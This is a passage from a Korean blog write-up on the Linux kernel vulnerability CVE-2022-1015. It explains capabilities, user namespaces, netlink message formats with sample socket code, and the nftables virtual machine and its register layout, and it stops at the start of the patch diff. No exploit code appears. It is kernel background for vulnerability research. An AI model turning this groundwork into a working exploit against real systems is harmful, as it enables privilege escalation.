    </details>
</div>

  <div class="post-content"><h1 id="backgrounds">Backgrounds<a hidden class="anchor" aria-hidden="true" href="#backgrounds">#</a></h1>
<h2 id="capabilites">Capabilites<a hidden class="anchor" aria-hidden="true" href="#capabilites">#</a></h2>
<p>요즘 리눅스들은 단순 root VS normal user가 아니다.
capabilities로 나뉘어져 권한이 부여된다.
즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.</p>
<h2 id="namespace">Namespace<a hidden class="anchor" aria-hidden="true" href="#namespace">#</a></h2>
<p>namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다.
여기엔 UID GID cred keys capabilites 등이 모두 포함된다.</p>
<ul>
<li>nested namespace
유저의 namespace는 중첩될 수 있다.
그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다.
0개 혹은 더 많은 child namespace를 가질 수 있다.
parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다.</li>
</ul>
<p>커널은 32개의 nested level로 제한을 둔다.
모든 프로세스는 정확히 하나의 유저 네임스페이스의 멤버이다.
fork나 clone에 CLONE_NEWUSER 플래그 없이 만들어졌으면 부모 프로세스와 똑같은 네임스페이스를 가진다.
도커 컨테이너 구현할때도 써진다.</p>
<p>하이퍼바이저랑 약간의 차이가 있는데, 하이퍼바이저는 하드웨어를 가상화한다.
그런데 네임스페이스는 하드웨어를 분리하지 않고 동일한 OS나 커널에서 돌아간다.</p>
<p>Namespace가 중요한 이유는, attack vector가 넓어지기 때문에.</p>
<h2 id="netfilter-서브시스템">Netfilter 서브시스템<a hidden class="anchor" aria-hidden="true" href="#netfilter-서브시스템">#</a></h2>
<p>넷필터는 네트워크 패킷처리나 라우팅 등 여러가지 기능을 처리해주는 커널의 서브시스템중 하나이다.
넷필터 프로젝트라고 커널의 그쪽 부분을 담당하는 프로젝트이다.
필터링 라우팅 NAT 패킷 수정 등을 처리한다.</p>
<h2 id="netlink-socket">Netlink socket<a hidden class="anchor" aria-hidden="true" href="#netlink-socket">#</a></h2>
<p>넷링크 소켓은 커널과 사용자 공간사이 통신할 수 있는 IPC 메커니즘 중 하나이다.
하나 이상의 Netlink message를 붙여서 request response 단위로 묶어서 전송을 구현한다.
Header와 payload는 align 맞추기 위해서 padding도 있을 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#f92672">+----------------------+----------------------+----------------------+----------------------+</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">+----------------------+</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">|</span>  <span style="color:#a6e22e">Netlink</span> <span style="color:#a6e22e">messaeg</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>  <span style="color:#f92672">|</span>  <span style="color:#a6e22e">Netlink</span> <span style="color:#a6e22e">messaeg</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">2</span>  <span style="color:#f92672">|</span>  <span style="color:#a6e22e">Netlink</span> <span style="color:#a6e22e">messaeg</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">3</span>  <span style="color:#f92672">|</span>  <span style="color:#a6e22e">Netlink</span> <span style="color:#a6e22e">messaeg</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">4</span>  <span style="color:#f92672">|</span>    ...    <span style="color:#f92672">|</span>  <span style="color:#a6e22e">Netlink</span> <span style="color:#a6e22e">messaeg</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">n</span>  <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">|</span> (<span style="color:#a6e22e">Header</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Payload</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Pad</span>) <span style="color:#f92672">|</span> (<span style="color:#a6e22e">Header</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Payload</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Pad</span>) <span style="color:#f92672">|</span> (<span style="color:#a6e22e">Header</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Payload</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Pad</span>) <span style="color:#f92672">|</span> (<span style="color:#a6e22e">Header</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Payload</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Pad</span>) <span style="color:#f92672">|</span>           <span style="color:#f92672">|</span> (<span style="color:#a6e22e">Header</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Payload</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Pad</span>) <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">+----------------------+----------------------+----------------------+----------------------+</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">+----------------------+</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;---------------------------------------------------</span> <span style="color:#a6e22e">Request</span> <span style="color:#a6e22e">OR</span> <span style="color:#a6e22e">Response</span> <span style="color:#a6e22e">packet</span> <span style="color:#f92672">-----------------------------------------------&gt;</span>
</span></span></code></pre></div><p><img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/b5f54edb8586668169382d09387b6ae2.png" alt=""  />

message format은 이렇게 생겼다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Plain" data-lang="Plain"><span style="display:flex;"><span>  &lt;------- NLA_HDRLEN ------&gt; &lt;-- NLA_ALIGN(payload)--&gt;
</span></span><span style="display:flex;"><span> +---------------------+- - -+- - - - - - - - - -+- - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
</span></span><span style="display:flex;"><span> |        Header       | Pad |     Payload       | Pad | ... (Next attribute) ...
</span></span><span style="display:flex;"><span> |   (struct nlattr)   | ing |                   | ing |
</span></span><span style="display:flex;"><span> +---------------------+- - -+- - - - - - - - - -+- - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
</span></span><span style="display:flex;"><span> ↑ nlattr
</span></span><span style="display:flex;"><span>  &lt;-------------- nlattr-&gt;nla_len --------------&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> nla_type (16 bits)
</span></span><span style="display:flex;"><span> +---+---+-------------------------------+
</span></span><span style="display:flex;"><span> | N | O | Attribute Type                |
</span></span><span style="display:flex;"><span> +---+---+-------------------------------+
</span></span><span style="display:flex;"><span> N := Carries nested attributes
</span></span><span style="display:flex;"><span> O := Payload stored in network byte order
</span></span><span style="display:flex;"><span> Note: The N and O flag are mutually exclusive.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#f92672">&lt;-----</span> <span style="color:#a6e22e">NLMSG_HDRLEN</span> <span style="color:#f92672">------&gt;</span> <span style="color:#f92672">&lt;--------</span> <span style="color:#a6e22e">Payload</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Len</span> <span style="color:#f92672">--------&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">+---------------------+-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-+-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-+</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">|</span>        <span style="color:#a6e22e">Header</span>       <span style="color:#f92672">|</span> <span style="color:#a6e22e">Pad</span> <span style="color:#f92672">|</span>            <span style="color:#a6e22e">Payload</span>            <span style="color:#f92672">|</span> ... (<span style="color:#a6e22e">Next</span> <span style="color:#a6e22e">netlink</span> <span style="color:#a6e22e">message</span>) ...
</span></span><span style="display:flex;"><span> <span style="color:#f92672">|</span>  (<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nlmsghdr</span>)  <span style="color:#f92672">|</span> <span style="color:#a6e22e">ing</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">Specific</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">+</span> [<span style="color:#a6e22e">attribute</span>..] <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">+---------------------+-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-+-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-+</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span> <span style="color:#f92672">~</span>
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">↑</span> <span style="color:#a6e22e">nlmsghdr</span>                  <span style="color:#960050;background-color:#1e0010">↑</span> <span style="color:#a6e22e">NLMSG_DATA</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nlmsghdr</span>)         <span style="color:#960050;background-color:#1e0010">↑</span> <span style="color:#a6e22e">NLMSG_NEXT</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">nlmsghdr</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;------------------</span> <span style="color:#a6e22e">nlmsghdr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nlmsg_len</span> <span style="color:#f92672">------------------&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;------------------</span> <span style="color:#a6e22e">NLMSG_LENGTH</span>(<span style="color:#a6e22e">Payload</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Len</span>) <span style="color:#f92672">------------&gt;</span>
</span></span></code></pre></div><p>넷링크 헤더, 속성 구조체의 모습이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nlmsghdr</span> {
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint32_t</span> <span style="color:#a6e22e">nlmsg_len</span>;      <span style="color:#75715e">/* Header를 포함한 Netlink message 크기 */</span>
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint16_t</span> <span style="color:#a6e22e">nlmsg_type</span>;     <span style="color:#75715e">/* Message content */</span>
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint16_t</span> <span style="color:#a6e22e">nlmsg_flags</span>;    <span style="color:#75715e">/* Additional flags */</span>
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint32_t</span> <span style="color:#a6e22e">nlmsg_seq</span>;      <span style="color:#75715e">/* Sequence number */</span>
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint32_t</span> <span style="color:#a6e22e">nlmsg_pid</span>;      <span style="color:#75715e">/* Sending process port ID */</span>
</span></span><span style="display:flex;"><span> };
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nlattr</span> {
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint16_t</span> <span style="color:#a6e22e">nla_len</span>; <span style="color:#75715e">/* Header를 포함한 attribute 크기 */</span>
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">uint16_t</span> <span style="color:#a6e22e">nla_type</span>; <span style="color:#75715e">/* Attribute type */</span>
</span></span><span style="display:flex;"><span> };
</span></span></code></pre></div><p>어떤식으로로 구현하는지에 대한 예제도 examples에서 찾을 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">s_socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(<span style="color:#a6e22e">PF_NETLINK</span>, <span style="color:#a6e22e">SOCK_RAW</span>, <span style="color:#a6e22e">NETLINK_XFRM</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__u32</span> <span style="color:#a6e22e">s_nl_groups</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sockaddr_nl</span> <span style="color:#a6e22e">s_sockaddr_nl</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_ACQUIRE</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_EXPIRE</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_SA</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_POLICY</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_AEVENTS</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_REPORT</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_MIGRATE</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_MAPPING</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_family</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">AF_NETLINK</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_pad</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">short</span>)<span style="color:#ae81ff">0</span><span style="color:#a6e22e">u</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_pid</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">pid_t</span>)<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_groups</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_nl_groups</span>; <span style="color:#75715e">/* Multicast groups mask */</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">s_socket</span>, (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s_sockaddr_nl</span>), (<span style="color:#a6e22e">socklen_t</span>)<span style="color:#a6e22e">sizeof</span>(<span style="color:#a6e22e">s_sockaddr_nl</span>));
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">sock_fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(<span style="color:#a6e22e">AF_NETLINK</span>, <span style="color:#a6e22e">SOCK_RAW</span>, <span style="color:#a6e22e">NETLINK_ROUTE</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__u32</span> <span style="color:#a6e22e">s_nl_groups</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sockaddr_nl</span> <span style="color:#a6e22e">s_sockaddr_nl</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_ACQUIRE</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_EXPIRE</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_SA</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_POLICY</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_AEVENTS</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_REPORT</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_MIGRATE</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_nl_groups</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">XFRMNLGRP_MAPPING</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_family</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">AF_NETLINK</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_pad</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">short</span>)<span style="color:#ae81ff">0</span><span style="color:#a6e22e">u</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_pid</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">pid_t</span>)<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_sockaddr_nl</span>.<span style="color:#a6e22e">nl_groups</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_nl_groups</span>; <span style="color:#75715e">/* Multicast groups mask */</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">s_socket</span>, (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s_sockaddr_nl</span>), (<span style="color:#a6e22e">socklen_t</span>)<span style="color:#a6e22e">sizeof</span>(<span style="color:#a6e22e">s_sockaddr_nl</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">socklen_t</span> <span style="color:#a6e22e">s_socklen</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_socklen</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">socklen_t</span>)<span style="color:#a6e22e">sizeof</span>(<span style="color:#a6e22e">s_sockaddr_nl</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_recv_bytes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">recvfrom</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s_socket</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s_buffer</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s_buffer_size</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MSG_NOSIGNAL</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s_sockaddr_nl</span>),
</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">socklen_t</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s_socklen</span>)
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">size_t</span> <span style="color:#a6e22e">s_msg_size</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nlmsghdr</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">s_nlmsghdr</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">size_t</span> <span style="color:#a6e22e">s_payload_size</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">s_payload</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s_msg_size</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">size_t</span>)<span style="color:#a6e22e">s_recv_bytes</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">s_nlmsghdr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nlmsghdr</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">s_buffer</span>;(<span style="color:#a6e22e">s_is_break</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">NLMSG_OK</span>(<span style="color:#a6e22e">s_nlmsghdr</span>, <span style="color:#a6e22e">s_msg_size</span>);<span style="color:#a6e22e">s_nlmsghdr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NLMSG_NEXT</span>(<span style="color:#a6e22e">s_nlmsghdr</span>, <span style="color:#a6e22e">s_msg_size</span>)) {            <span style="color:#75715e">/* Netlink 수신패킷 하나에 여러개의 Netlink header가 탑재될 수 있는데 이를 각 Header 단위로 분리하는 Loop */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s_payload_size</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">size_t</span>)<span style="color:#a6e22e">NLMSG_PAYLOAD</span>(<span style="color:#a6e22e">s_nlmsghdr</span>, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">/* Header 내의 실제 Data 크기 */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s_payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">NLMSG_DATA</span>(<span style="color:#a6e22e">s_nlmsghdr</span>); <span style="color:#75715e">/* Header 내의 실제 Data 위치 포인터 */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(<span style="color:#a6e22e">s_nlmsghdr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nlmsg_type</span>) { <span style="color:#75715e">/* 각 메세지의 종류별로 다른 파싱구조를 가지고 있으므로 커널을 참조하여 해당 부분을 파싱해야 합니다. */</span>
</span></span><span style="display:flex;"><span>        .....
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>도메인은 AF_NETLINK를 쓰고 SOCK_RAW를 사용한다.
netlink protocol은 netlink group과 kernel modules간의 통신을 위해 Netlink family를 선택한다.
NETLINK_ROUTE : routing 업데이트 및 ipv4 routing 등등</p>
<h2 id="nftables">nftables<a hidden class="anchor" aria-hidden="true" href="#nftables">#</a></h2>
<p>ip tables, ip6 tables, arp tables, eb tables을 대체할 수 있다.
원래는 ip tables가 패킷 필터링 기능을 수행했지만 ip tables를 대체할 프레임워크로 nftables가 나왔다.
넷필터 서브시스템에서 nftables가 iptables 역할을 대신해서 vm 기반 룰을 작성할 수 있다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/5870af24a4a5aed263dc78ae1f83b3c6.png" alt=""  />

iptables VS nftables
차이는 위와 같다.
nftables는 커널 내부의 경량 가상머신을 이용해서 패킷이 필터링 된다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/8280e84d81cbdb6010d5de0320b56e88.png" alt=""  />

훅포인트는 5개이다.
Prerouting은 NIC 카드에 패킷 들어왔을때, Input은 packet이 local로 들어왔을때
등
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/80ac0503a044cc25d8f0fb28a57f4464.png" alt=""  />

중요한 오브젝트들이 많다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/eda308955340acbfbd7df373f4aef110.png" alt=""  />

제일 중요한 테이블이 있다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/cdd5834d39e1043fcdfa59157abd2541.png" alt=""  />

<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/2b6efc760dc252191c24b9788b28e15e.png" alt=""  />

chain들은 rule의 집합이고 rule은 expression의 집합이다.
meta cmp payload bitwise immediate etc..
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/3f2df32b98ace8c7727ab9a8dd4a575f.png" alt=""  />

register가 16바이트짜리가 있음.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/447a27296f02fa9b3df719e1c458c401.png" alt=""  />

레지스터인데 메모리로 처리한다.
선형적인 메모리 레이아웃
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/844fbfc61ef87f8fd28a9aa475439976.png" alt=""  />

meta expression이 있다.
vm에서 map이 지원되기 때문에, key에 해당하는 데이터를 로드하고 저장가능.
bitwise는 레지스터간 bit 연산을 수행한다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/e9cb1cbc5fd4ea4af58687b5d4352ebf.png" alt=""  />

payload가 있는데, 데이터 복사에 사용된다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/668e88dad570d28742eaa76aa1ee6e8a.png" alt=""  />
</p>
<h1 id="cve-2022-1015">CVE-2022-1015<a hidden class="anchor" aria-hidden="true" href="#cve-2022-1015">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nf_tables_api.c <span style="color:#f92672">|</span> <span style="color:#ae81ff">22</span> <span style="color:#f92672">+++++++++++++++++-----</span>
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span> file changed, <span style="color:#ae81ff">17</span> <span style="color:#a6e22e">insertions</span>(<span style="color:#f92672">+</span>), <span style="color:#ae81ff">5</span> <span style="color:#a6e22e">deletions</span>(<span style="color:#f92672">-</span>)
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nf_tables_api.c b<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nf_tables_api.c
</span></span><span style="display:flex;"><span>index d71a33ae39b3.<span style="color:#ae81ff">.1f</span><span style="color:#ae81ff">5</span>a0eece0d1 <span style="color:#ae81ff">100644</span>
